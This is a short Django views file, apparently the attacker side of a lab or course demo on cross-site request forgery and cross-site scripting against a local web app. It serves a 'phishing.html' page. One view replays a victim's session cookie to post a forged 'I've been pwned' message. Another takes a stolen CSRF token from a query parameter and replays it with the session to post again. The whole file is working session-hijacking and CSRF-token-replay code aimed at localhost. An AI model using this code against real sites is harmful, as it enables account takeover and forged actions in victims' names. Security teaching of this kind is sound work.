import datetime
import requests

from django.shortcuts import render, redirect


# Create your views here.
def mainView(request):
  return render(request, 'phishing.html')

def pwnView(request):
  session_id = request.session.session_key
  timestamp = datetime.datetime.now().strftime("%d/%m/%y %H:%M:%S")
  url = "http://localhost:8000/send"
  form_data = {"message": "I've been pwned on " + timestamp}
  cookies = {"sessionid": session_id}

  requests.post(url, data=form_data, cookies=cookies)

  return redirect('http://localhost:8000')

def xssView(request):
  session_id = request.session.session_key
  csrf_token = request.GET['csrftoken']
  timestamp = datetime.datetime.now().strftime("%d/%m/%y %H:%M:%S")
  url = "http://localhost:8000/send"
  form_data = {"message": "I've been pwned again on " + timestamp}
  cookies = {"sessionid": session_id, "csrftoken": csrf_token}
  headers = {"X-CSRFToken": csrf_token}

  requests.post(url, data=form_data, cookies=cookies, headers=headers)

  return redirect('http://localhost:8000')
